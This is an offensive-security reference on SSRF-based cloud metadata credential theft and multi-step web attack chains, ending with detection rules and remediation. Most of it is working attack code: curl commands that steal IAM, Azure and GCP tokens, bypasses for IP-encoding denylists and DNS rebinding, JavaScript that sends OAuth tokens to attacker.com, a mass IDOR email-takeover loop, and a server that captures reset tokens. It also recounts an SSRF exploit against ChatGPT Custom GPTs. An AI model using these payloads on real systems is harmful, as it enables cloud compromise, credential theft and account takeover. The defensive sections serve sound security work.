# SSRF, Cloud Metadata Theft & Multi-Step Attack Chains

## Overview

This document covers Server-Side Request Forgery (SSRF) attacks targeting cloud metadata services for IAM credential theft, IP encoding bypass techniques, DNS rebinding, and multi-step attack chains including XSS-to-OAuth token theft, IDOR-to-account takeover, and Host Header Injection for password reset poisoning. These chains demonstrate how individual medium-severity vulnerabilities combine into critical-severity exploitation paths.

---

## 1. SSRF to Cloud Metadata to IAM Credential Theft

### 1.1 Attack Theory

An SSRF vulnerability in a web application is exploited to reach cloud provider metadata services, retrieve temporary IAM credentials or managed identity tokens, and pivot to full infrastructure compromise.

**Cloud Metadata Endpoints:**

| Provider | Endpoint | Required Header | Credential Path |
|----------|----------|-----------------|-----------------|
| AWS IMDSv1 | `http://169.254.169.254/latest/meta-data/` | None | `/iam/security-credentials/<RoleName>` |
| AWS IMDSv2 | `http://169.254.169.254/latest/api/token` | PUT with `X-aws-ec2-metadata-token-ttl-seconds` | Same, with token header |
| Azure IMDS | `http://169.254.169.254/metadata/instance` | `Metadata: true` | `?api-version=2021-02-01` |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` | `Metadata-Flavor: Google` | `/instance/service-accounts/default/token` |

### 1.2 CVE Reference Table

| CVE | Component | CVSS | Description |
|-----|-----------|------|-------------|
| CVE-2024-21893 | Ivanti Connect Secure | Critical | SSRF via SAML `/dana-ws/saml20.ws` (unauthenticated) |
| CVE-2024-21887 | Ivanti Connect Secure | Critical | Command injection chained with CVE-2024-21893 |
| CVE-2025-4427 | Ivanti EPMM | Critical | Authentication bypass in API component |
| CVE-2025-4428 | Ivanti EPMM | Critical | Expression Language injection (chained with CVE-2025-4427) |
| CVE-2025-61882 | Oracle E-Business Suite | 9.8 | SSRF + CRLF + XSLT = pre-auth RCE (exploited by Cl0p) |
| CVE-2026-69192 | ip-address npm library | High | Leading-zero octet confusion: decimal vs octal parsing |
| CVE-2026-44589 | nuxt-og-image | High | IPv6 denylist bypass via `[::ffff:7f00:1]` |
| CVE-2026-27127 | Craft CMS | 7.0 | DNS rebinding TOCTOU race for SSRF bypass |

### 1.3 Basic SSRF to IMDSv1 Reproduction

```bash
# Step 1: Identify SSRF-capable endpoint
# Common surfaces: URL fetchers, webhook configs, file import via URL,
# PDF generators, image proxies, API integrations accepting user URLs
curl 'https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/'
# If response contains: ami-id, hostname, iam/ -- SSRF confirmed

# Step 2: List available IAM roles
curl 'https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'
# Response: MyAppRole

# Step 3: Retrieve temporary IAM credentials
curl 'https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/MyAppRole'
# Response:
# {
#   "Code": "Success",
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "wJalr...",
#   "Token": "FwoG...",
#   "Expiration": "2026-10-10T12:00:00Z"
# }

# Step 4: Use stolen credentials
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="wJalr..."
export AWS_SESSION_TOKEN="FwoG..."

# Verify identity
aws sts get-caller-identity

# Enumerate accessible resources
aws s3 ls
aws ec2 describe-instances
aws secretsmanager list-secrets
aws iam list-roles
```

### 1.4 Azure and GCP Metadata Theft

```bash
# Azure IMDS (requires Metadata header)
curl 'https://target.com/api/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01' \
  -H 'Metadata: true'

# Azure Management API token
curl 'https://target.com/api/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' \
  -H 'Metadata: true'

# GCP metadata
curl 'https://target.com/api/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' \
  -H 'Metadata-Flavor: Google'

# GCP project-wide metadata (may contain secrets)
curl 'https://target.com/api/fetch?url=http://metadata.google.internal/computeMetadata/v1/project/attributes/' \
  -H 'Metadata-Flavor: Google'
```

---

## 2. IP Encoding Bypass Reference

### 2.1 Complete IP Encoding Table for 169.254.169.254

| Encoding | Value | Notes |
|----------|-------|-------|
| Dotted decimal (standard) | `169.254.169.254` | Commonly blocked |
| Decimal (single integer) | `2852039166` | `169*256^3 + 254*256^2 + 169*256 + 254` |
| Octal | `0251.0376.0251.0376` | Each octet in octal notation |
| Hexadecimal | `0xa9fea9fe` | Single hex integer |
| Dotted hex | `0xa9.0xfe.0xa9.0xfe` | Each octet in hex |
| IPv6 mapped | `::ffff:169.254.169.254` | IPv4-mapped IPv6 |
| IPv6 hex | `[::ffff:a9fe:a9fe]` | Pure hex IPv6 form |
| Mixed | `::ffff:a9fe:a9fe` | Without brackets |
| URL-encoded dots | `169%2e254%2e169%2e254` | Dots URL-encoded |
| Overflow | `169.254.169.254.0` | Extra octet (some parsers accept) |
| CIDR trick | `169.254.169.254/32` | With CIDR notation |

### 2.2 Complete IP Encoding Table for 127.0.0.1

| Encoding | Value | Notes |
|----------|-------|-------|
| Standard | `127.0.0.1` | Commonly blocked |
| Decimal | `2130706433` | Single integer |
| Octal | `0177.0.0.01` | Octal notation |
| Hex | `0x7f000001` | Single hex |
| IPv6 | `::1` | Localhost IPv6 |
| IPv6 mapped | `::ffff:127.0.0.1` | IPv4-mapped |
| IPv6 hex | `[::ffff:7f00:1]` | Pure hex IPv6 |
| Short form | `127.1` | Omitting zero octets |
| Zero-expanded | `127.0.0.0.0.0.0.0.0.0.0.0.0.0.1` | Some parsers accept |

### 2.3 CVE-2026-69192: Leading-Zero Octet Confusion

The `ip-address` npm library parses leading-zero octets as decimal, while the operating system parses them as octal:

```bash
# Validator sees: 012.0.0.1 -> decimal -> 12.0.0.1 (allowed)
# OS resolves:    012.0.0.1 -> octal   -> 10.0.0.1 (internal!)

# Bypass example targeting internal network
curl 'https://target.com/api/fetch?url=http://012.0.0.1/admin'
# Validator: "12.0.0.1 is not in denylist" -> PASS
# HTTP client: connects to 10.0.0.1 -> internal service reached

# More examples:
# 0177.0.0.01 -> validator sees "177.0.0.1" -> OS connects to 127.0.0.1
# 0251.0376.0251.0376 -> validator sees "251.376.251.376" (invalid?) -> OS connects to 169.254.169.254
```

### 2.4 CVE-2026-44589: IPv6 Denylist Bypass

Regex-based denylists matching only dotted-quad IPv4 notation miss pure-hex IPv6 forms:

```bash
# Typical denylist regex: /^(127\.|10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|169\.254\.)/
# This misses IPv6 equivalents:

# Bypass 127.0.0.1 denylist
curl 'https://target.com/api/fetch?url=http://[::ffff:7f00:1]/'

# Bypass 169.254.169.254 denylist
curl 'https://target.com/api/fetch?url=http://[::ffff:a9fe:a9fe]/latest/meta-data/'

# Bypass 10.0.0.1 denylist
curl 'https://target.com/api/fetch?url=http://[::ffff:a00:1]/'

# Bypass 192.168.1.1 denylist
curl 'https://target.com/api/fetch?url=http://[::ffff:c0a8:101]/'
```

**Fix:** Normalize all IP representations to a canonical 128-bit form before comparison.

---

## 3. DNS Rebinding Bypass Technique

### 3.1 How It Works

DNS rebinding exploits the time-of-check/time-of-use (TOCTOU) gap between URL validation and HTTP connection:

1. Attacker registers domain `evil.attacker.com` with TTL=0
2. First DNS resolution returns a public IP (passes validation)
3. Second DNS resolution returns `169.254.169.254` (reaches metadata)

### 3.2 Reproduction

```bash
# Step 1: Set up a rebinding DNS service
# Option A: Use rbndr.us
# URL: http://7f000001.a9fea9fe.rbndr.us/
# Alternates between 127.0.0.1 and 169.254.169.254

# Option B: Use your own DNS server
# Configure zone file:
# evil.attacker.com  IN A 1.2.3.4    (first query - public IP)
# evil.attacker.com  IN A 169.254.169.254  (second query - metadata)
# Set TTL=0 to prevent caching

# Step 2: Submit rebinding domain to SSRF endpoint
curl 'https://target.com/api/fetch?url=http://7f000001.a9fea9fe.rbndr.us/latest/meta-data/'

# The validator resolves to 127.0.0.1 or public IP (passes check)
# The HTTP client re-resolves to 169.254.169.254 (reaches metadata)

# Step 3: May require multiple attempts due to DNS caching
for i in $(seq 1 20); do
  curl -s 'https://target.com/api/fetch?url=http://7f000001.a9fea9fe.rbndr.us/latest/meta-data/iam/security-credentials/' | head -1
  sleep 1
done
```

**Documented DNS rebinding CVEs:** MLflow #24179, Craft CMS GHSA-gp2f-7wcm-5fhx (CVE-2026-27127)

---

## 4. IMDSv2 Bypass Attempts

### 4.1 IMDSv2 Token Acquisition via Header Injection

IMDSv2 requires a PUT request to obtain a session token, then the token in subsequent GET requests. If the SSRF primitive allows header control:

```bash
# Step 1: Obtain IMDSv2 session token (requires PUT with custom header)
# If the SSRF allows method and header control:
curl -X PUT 'https://target.com/api/fetch?url=http://169.254.169.254/latest/api/token' \
  -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'

# Step 2: Use token to access metadata
curl 'https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole' \
  -H 'X-aws-ec2-metadata-token: <token_from_step1>'
```

### 4.2 ChatGPT Custom GPTs Header Injection Pattern

In the documented ChatGPT attack, the researcher:

1. Bypassed HTTPS enforcement via 302 redirect from HTTPS host to HTTP metadata URL
2. Injected `Metadata: true` header using the Custom GPT's API key configuration field
3. Retrieved Azure Management API OAuth token

```bash
# Step 1: Set up redirect on attacker-controlled HTTPS host
# https://your-server.com/redirect -> HTTP 302 -> http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# Step 2: If application allows custom header configuration (API keys, auth headers),
# set header name to "Metadata" and value to "true"

# Step 3: Trigger SSRF via redirect
curl 'https://target.com/api/fetch?url=https://your-server.com/redirect'
# Application follows redirect to Azure IMDS, sends Metadata:true header
# Returns Azure Management API OAuth token
```

### 4.3 Redirect-Based SSRF Bypass

```bash
# Host a redirect on your server
# Configure your-server.com/redirect to return:
# HTTP/1.1 302 Found
# Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Submit HTTPS URL (passes HTTPS-only validation)
curl 'https://target.com/api/fetch?url=https://your-server.com/redirect'

# Application follows 302 redirect to HTTP metadata endpoint
# Many URL validators check only the initial URL, not redirect destinations
```

---

## 5. SSRF to Internal API to RCE Chains

### 5.1 CVE-2024-21893 -> CVE-2024-21887: Ivanti Connect Secure

**Chain:** SSRF via SAML -> Internal API access -> Command injection -> RCE

```bash
# Step 1: SSRF via unauthenticated SAML endpoint
curl -X POST https://target/dana-ws/saml20.ws \
  -H 'Content-Type: text/xml' \
  -d '<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
      <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
        http://169.254.169.254/latest/meta-data/
      </saml:Issuer>
    </samlp:AuthnRequest>
  </soap:Body>
</soap:Envelope>'

# Step 2: Chain with CVE-2024-21887 command injection
# Target internal endpoint via SSRF to inject OS commands
# Public PoC by Rapid7 and AssetNote

# Observed: 170+ distinct attacker IPs exploiting this chain
# CISA KEV catalog entry
```

### 5.2 CVE-2025-4427 + CVE-2025-4428: Ivanti EPMM

**Chain:** Authentication bypass -> Expression Language injection -> RCE

```bash
# Step 1: Auth bypass (CVE-2025-4427) to obtain session cookie
# Send requests to EPMM API that trigger the authentication bypass

# Step 2: EL injection via Spring error messages (CVE-2025-4428)
# Use authenticated session to trigger an error condition
# Attacker-controlled input processed through Java Expression Language
# Achieves code execution

# Post-exploitation: KrustyLoader malware delivered
# Affected: NHS trusts
# CISA KEV with June 9, 2025 patch deadline
```

**Sigma detection rule:** `web_invanti_epmm_cve_2025_4427_and_cve_2025_4428`

### 5.3 CVE-2025-61882: Oracle E-Business Suite

**Chain:** SSRF via UiServlet -> CRLF header injection -> Path traversal -> Host header manipulation -> XSLT RCE

```bash
# Multi-stage chain:
# 1. SSRF via /configurator/UiServlet with crafted return_url
# 2. CRLF injection (%0d%0a) to add custom headers to server-side request
# 3. Path traversal to survey JSP
# 4. Attacker-controlled Host header directs XSLT processing
#    to fetch malicious XSL payload from attacker server
# 5. XSLT processor executes attacker's XSL = pre-auth RCE

# CVSS: 9.8
# Exploited by Cl0p ransomware starting August 9, 2025
# CISA KEV with October 27, 2025 deadline
```

---

## 6. XSS to OAuth Token Theft Chain

### 6.1 Attack Flow

1. **XSS Entry:** Identify injection point (e.g., Hotjar's `returnURL=javascript:` URI)
2. **OAuth Flow Initiation:** Injected script opens popup to OAuth authorization endpoint
3. **Silent Token Capture:** Popup completes OAuth flow automatically if user has active session
4. **Token Exfiltration:** Script reads token from popup window and sends to attacker server
5. **Account Takeover:** Attacker authenticates as victim using stolen OAuth token

### 6.2 Reproduction

#### Hotjar-Style XSS + OAuth Popup Token Theft

```html
<!-- Step 1: XSS via returnURL parameter -->
<!-- https://insights.hotjar.com/auth?returnURL=javascript:void(document.location='https://attacker.com/steal?token='+localStorage.getItem('access_token')) -->

<!-- Full exploitation page -->
<!DOCTYPE html>
<html>
<head><title>OAuth Token Theft PoC</title></head>
<body>
<script>
// Step 1: Open OAuth popup
var popup = window.open(
  'https://accounts.google.com/o/oauth2/auth' +
  '?client_id=TARGET_CLIENT_ID' +
  '&redirect_uri=https://target-app.com/oauth/callback' +
  '&response_type=token' +
  '&scope=openid+email+profile',
  'oauth_popup',
  'width=500,height=600'
);

// Step 2: Poll popup for token
var interval = setInterval(function() {
  try {
    // Check if popup redirected back with token in fragment
    var hash = popup.location.hash;
    if (hash && hash.indexOf('access_token') !== -1) {
      clearInterval(interval);
      
      // Step 3: Extract token
      var params = new URLSearchParams(hash.substring(1));
      var token = params.get('access_token');
      
      // Step 4: Exfiltrate
      fetch('https://attacker.com/collect', {
        method: 'POST',
        body: JSON.stringify({
          token: token,
          victim: 'captured'
        })
      });
      
      popup.close();
    }
  } catch(e) {
    // Cross-origin - popup hasn't redirected back yet
  }
}, 100);
</script>
</body>
</html>
```

#### localStorage Token Theft (Simpler Variant)

```html
<script>
// Direct theft if tokens stored in localStorage
fetch('https://attacker.com/steal?token=' +
  localStorage.getItem('access_token') +
  '&refresh=' + localStorage.getItem('refresh_token'));
</script>
```

#### Self-XSS + Login CSRF + OAuth Chain

```html
<!-- Step 1: Force victim into attacker's session via login CSRF -->
<iframe style="display:none" name="csrf_frame"></iframe>
<form id="login_csrf" action="https://target.com/login" method="POST" target="csrf_frame">
  <input name="username" value="attacker_account">
  <input name="password" value="attacker_password">
</form>

<!-- Step 2: Self-XSS executes in victim's browser (in attacker's session) -->
<!-- Step 3: Payload initiates OAuth flow capturing victim's real token -->
<script>
document.getElementById('login_csrf').submit();
setTimeout(function() {
  // After login CSRF, inject self-XSS payload
  // that initiates OAuth flow with victim's real credentials
  window.location = 'https://target.com/vulnerable?param=' +
    encodeURIComponent('<script>/* OAuth popup theft */<\/script>');
}, 2000);
</script>
```

### 6.3 Defense

- Move OAuth tokens to server-side storage (BFF pattern)
- Implement strict CSP: `default-src 'self'; script-src 'nonce-{random}'; object-src 'none'; base-uri 'self'`
- Enforce exact `redirect_uri` matching
- Use PKCE for all OAuth flows
- Never store tokens in localStorage; use memory-only storage

---

## 7. IDOR to Email Change to Password Reset Chain

### 7.1 Attack Flow

1. **IDOR Discovery:** Identify sequential/predictable IDs in account management endpoints
2. **Email Modification:** Swap user ID in PUT/PATCH request to change victim's email
3. **Password Reset:** Trigger password reset to the newly set attacker-controlled email
4. **Account Takeover:** Complete reset and gain full access

### 7.2 CVE Reference

| CVE | Component | CVSS | Description |
|-----|-----------|------|-------------|
| CVE-2026-32103 | StudioCMS | Critical | `create-reset-link` endpoint allows any admin to generate reset JWT for any user; token returned in response |
| CVE-2026-93556 | Kompini Tankuam Places | 9.3 | Unauthenticated password reset of any account including admin |

### 7.3 Reproduction

```bash
# Step 1: Create two accounts (A=1001, B=1002)
# Log in as attacker (Account A)

# Step 2: Intercept account update and swap user ID
curl -X PUT https://target/api/users/1002 \
  -H 'Authorization: Bearer <AccountA_token>' \
  -H 'Content-Type: application/json' \
  -d '{"email":"attacker@evil.com"}'
# If server returns 200, victim B's email is now attacker@evil.com

# Step 3: Trigger password reset
curl -X POST https://target/api/password-reset \
  -d '{"email":"attacker@evil.com"}'
# Reset email sent to attacker's email for victim B's account

# Step 4: Complete password reset
curl -X POST https://target/api/reset-password \
  -d '{"token":"<token_from_email>","password":"NewP@ssw0rd!"}'

# Step 5: Login as victim
curl -X POST https://target/api/login \
  -d '{"email":"attacker@evil.com","password":"NewP@ssw0rd!"}'
```

#### Reset Token Leak Variant

```bash
# Some APIs return the reset token directly in the response body
curl 'https://target/api/password-reset?userId=1002'
# Response: {"resetToken": "abc123def456", "expiresIn": 3600}

# Submit token directly
curl -X POST https://target/api/reset-password \
  -d '{"token":"abc123def456","password":"NewP@ssw0rd!"}'
```

#### Mass Exploitation Script

```bash
#!/bin/bash
# Mass IDOR exploitation - enumerate user IDs
for id in $(seq 1 10000); do
  code=$(curl -s -o /dev/null -w '%{http_code}' \
    -X PUT "https://target/api/users/$id" \
    -H 'Authorization: Bearer <token>' \
    -H 'Content-Type: application/json' \
    -d '{"email":"attacker+'$id'@evil.com"}')
  if [ "$code" = "200" ]; then
    echo "[VULNERABLE] User ID: $id - email changed"
  fi
done
```

---

## 8. Host Header Injection to Password Reset Poisoning

### 8.1 Attack Flow

1. Attacker initiates password reset for victim's email
2. Injects malicious Host header pointing to attacker's domain
3. Application generates reset link using injected Host value
4. Victim receives legitimate email from real application but link points to attacker
5. Victim clicks link, reset token sent to attacker's server
6. Attacker uses token to reset victim's password

### 8.2 CVE Reference

| CVE | Component | CVSS | Description |
|-----|-----------|------|-------------|
| CVE-2025-43930 | Hashview (Flask) | 9.8 | Flask `url_for(_external=True)` uses unvalidated Host header when `SERVER_NAME` not configured |
| CVE-2025-52560 | Kanboard | High | `application_url` defaulting to empty causes Host header reliance |
| CVE-2025-64425 | Coolify | High | Complete step-by-step PoC available |
| CVE-2024-23648 | Pimcore Admin | High | Fixed in 1.2.3 |
| CVE-2025-61136 | sharewarez (Flask) | 7.1 | Flask app Host header injection |
| CVE-2025-61132 | braindump (Flask) | 7.1 | Flask app Host header injection |
| CVE-2026-27812 | sub2api | 8.0-9.1 | GHSA-vc2q-289v-74g3 |

### 8.3 Reproduction

```bash
# Basic Host header injection
curl -X POST https://target.com/forgot-password \
  -H 'Host: evil.com' \
  -d 'email=victim@example.com'
# Victim receives email with: https://evil.com/reset?token=abc123

# If Host is filtered, try alternative headers
curl -X POST https://target.com/forgot-password \
  -H 'X-Forwarded-Host: evil.com' \
  -d 'email=victim@example.com'

curl -X POST https://target.com/forgot-password \
  -H 'X-Forwarded-Server: evil.com' \
  -d 'email=victim@example.com'

curl -X POST https://target.com/forgot-password \
  -H 'X-Host: evil.com' \
  -d 'email=victim@example.com'

curl -X POST https://target.com/forgot-password \
  -H 'Forwarded: host=evil.com' \
  -d 'email=victim@example.com'

# Host with embedded credentials
curl -X POST https://target.com/forgot-password \
  -H 'Host: legitimate.com:80@evil.com' \
  -d 'email=victim@example.com'

# CRLF injection variant
curl -X POST https://target.com/forgot-password \
  -H $'Host: legitimate.com\r\nX-Forwarded-Host: evil.com' \
  -d 'email=victim@example.com'

# Duplicate Host headers
curl -X POST https://target.com/forgot-password \
  -H 'Host: legitimate.com' \
  -H 'Host: evil.com' \
  -d 'email=victim@example.com'

# Absolute URL in request line
printf 'POST https://evil.com/forgot-password HTTP/1.1\r\nHost: legitimate.com\r\nContent-Length: 25\r\n\r\nemail=victim@example.com' | openssl s_client -connect target.com:443
```

### 8.4 Capture and Complete

```bash
# Step 1: Set up token capture server on evil.com
python3 -c "
import http.server

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        print(f'[+] Captured token: {self.path}')
        # Extract token from URL
        if 'token=' in self.path:
            token = self.path.split('token=')[1].split('&')[0]
            print(f'[+] Reset token: {token}')
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'<html><body>Loading...</body></html>')

http.server.HTTPServer(('0.0.0.0', 443), Handler).serve_forever()
"

# Step 2: When victim clicks link, token captured at evil.com
# Server log shows: [+] Reset token: abc123def456

# Step 3: Submit token to legitimate application
curl -X POST https://legitimate.com/reset-password \
  -H 'Content-Type: application/json' \
  -d '{"token":"abc123def456","newPassword":"Pwned!2026"}'
```

---

## 9. Detection Signatures

### 9.1 SSRF Detection

```apache
# ModSecurity rules for SSRF

# Block requests to cloud metadata IPs
SecRule ARGS "@rx (169\.254\.169\.254|metadata\.google\.internal|168\.63\.129\.16)" \
  "id:8001,phase:2,deny,status:403,msg:'SSRF attempt targeting cloud metadata'"

# Block IP encoding bypasses (decimal, hex, octal)
SecRule ARGS "@rx (2852039166|0xa9fea9fe|0251\.0376)" \
  "id:8002,phase:2,deny,status:403,msg:'SSRF IP encoding bypass attempt'"

# Block IPv6 metadata variants
SecRule ARGS "@rx (::ffff:169\.254|::ffff:a9fe:a9fe|\[::ffff:a9fe)" \
  "id:8003,phase:2,deny,status:403,msg:'SSRF IPv6 metadata bypass attempt'"

# Block redirect-based SSRF patterns
SecRule RESPONSE_HEADERS:Location "@rx ^https?://(169\.254\.|10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)" \
  "id:8004,phase:4,deny,status:403,msg:'SSRF redirect to internal IP'"

# Block DNS rebinding indicators (TTL=0)
# (Requires DNS monitoring, not WAF-based)
```

### 9.2 Host Header Injection Detection

```apache
# Reject requests where Host doesn't match configured server
SecRule REQUEST_HEADERS:Host "!@rx ^(www\.)?legitimate-domain\.com$" \
  "id:8010,phase:1,deny,status:400,msg:'Invalid Host header'"

# Block X-Forwarded-Host from non-trusted sources
SecRule REQUEST_HEADERS:X-Forwarded-Host "!^$" \
  "chain,id:8011,phase:1,deny,status:400,msg:'Untrusted X-Forwarded-Host'"
SecRule REMOTE_ADDR "!@ipMatch 10.0.0.0/8,172.16.0.0/12"

# Block CRLF in Host header
SecRule REQUEST_HEADERS:Host "@rx [\r\n]" \
  "id:8012,phase:1,deny,status:400,msg:'CRLF in Host header'"
```

### 9.3 IDOR Detection

```yaml
# Sigma rule for IDOR exploitation patterns
title: Potential IDOR Account Takeover Attempt
status: experimental
logsource:
    category: webserver
detection:
    selection_rapid_enumeration:
        cs-method: 'PUT|PATCH'
        cs-uri-stem|re: '/api/(users|accounts)/\d+'
    timeframe: 60s
    condition: selection_rapid_enumeration | count(cs-uri-stem) > 10
level: high
tags:
    - attack.t1595
    - attack.t1078

---
# Alert when authenticated user modifies different user's resource
title: Cross-Account Resource Modification
status: experimental
logsource:
    category: application
detection:
    selection:
        action: 'account_update'
    filter:
        authenticated_user_id|ne: target_resource_user_id
    condition: selection and filter
level: critical
```

### 9.4 SSRF Monitoring

```bash
# Monitor outbound connections to metadata services
# iptables logging rule
iptables -A OUTPUT -d 169.254.169.254 -j LOG --log-prefix "SSRF_METADATA: " --log-level warning
iptables -A OUTPUT -d 169.254.169.254 -j DROP

# CloudTrail monitoring for stolen credential usage
# Alert on API calls from instance role at unexpected IPs
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventSource,AttributeValue=s3.amazonaws.com \
  --start-time "2026-10-01" \
  --query 'Events[?contains(CloudTrailEvent, `AssumedRole`) && !contains(CloudTrailEvent, `10.0.`)]'
```

---

## 10. Chaining Matrix

| Entry Vector | Chain Step 1 | Chain Step 2 | Final Impact |
|-------------|-------------|-------------|--------------|
| SSRF (URL fetcher) | Cloud metadata access | IAM credential theft | Full cloud account compromise |
| SSRF (CVE-2024-21893) | Internal API access (Ivanti) | Command injection (CVE-2024-21887) | Pre-auth RCE |
| SSRF (CVE-2025-4427) | Auth bypass (EPMM) | EL injection (CVE-2025-4428) | RCE + malware delivery |
| SSRF (CVE-2025-61882) | CRLF + path traversal | XSLT processing | Pre-auth RCE (Cl0p ransomware) |
| DNS rebinding | Bypass IP denylist | Metadata credential theft | Cloud pivot |
| IPv6 encoding bypass | Bypass regex denylist | Internal service access | Data exfiltration |
| XSS | OAuth popup token theft | API access as victim | Full account takeover |
| XSS + Login CSRF | Self-XSS execution | OAuth token capture | Cross-service ATO |
| IDOR (email change) | Email modification | Password reset | Account takeover |
| IDOR (reset token leak) | Token disclosure | Direct password reset | Mass account takeover |
| Host header injection | Reset link poisoning | Token capture on click | 1-click account takeover |
| SSRF + header injection | IMDSv2 token mint | EKS node-role credentials | Container cluster compromise |

---

## 11. Remediation Summary

### SSRF Prevention
1. **Enforce IMDSv2** with `HttpTokens=required`, hop limit 1 on all EC2 instances
2. **Egress firewall** blocking `169.254.169.254` and `168.63.129.16` from app servers
3. **Validate resolved IP addresses** (not hostnames) against denylist; normalize all IP forms to canonical 128-bit
4. **Pin resolved IP** for connection to prevent DNS rebinding
5. **Disable HTTP redirect following** or re-validate each redirect target
6. **Use allowlists** instead of denylists where possible
7. **Monitor CloudTrail** for API calls from instance role credentials at unexpected IPs

### IDOR Prevention
1. **Server-side ownership verification** on every object access
2. **Never rely on UUIDs or hashed IDs** as authorization controls
3. **Centralized authorization middleware** mapping authenticated user to permitted object set
4. **Log and alert** on cross-account access patterns

### Host Header Injection Prevention
1. **Configure strict hostname allowlist** at web server and load balancer
2. **Generate reset links from configuration** (hardcoded base URL), never from request headers
3. **For Flask:** always set `SERVER_NAME` in production
4. **Strip forwarded headers** from non-trusted proxy sources

### XSS + OAuth Prevention
1. **BFF pattern** for server-side token storage
2. **Strict CSP** with nonce-based script-src
3. **Exact `redirect_uri` matching** with mandatory PKCE
4. **Short access token lifetimes** (5-15 minutes)
5. **Token binding / DPoP** for sender-constrained tokens

### Key References
- ChatGPT SSRF: `sirleeroyjenkins.medium.com/when-gpts-call-home-exploiting-ssrf-in-chatgpts-custom-actions`
- SSRF cheat sheet: `vulnsy.com/cheat-sheets/ssrf`
- Cloud metadata SSRF: `techearl.com/cloud-metadata-ssrf`
- Salt Security Hotjar OAuth XSS: `salt.security/blog/over-1-million-websites-are-at-risk`
- OWASP IDOR: `owasp.org/www-community/attacks/insecure_direct_object_reference`
- RFC 9700 OAuth Security BCP: `rfc-editor.org/rfc/rfc9700.html`
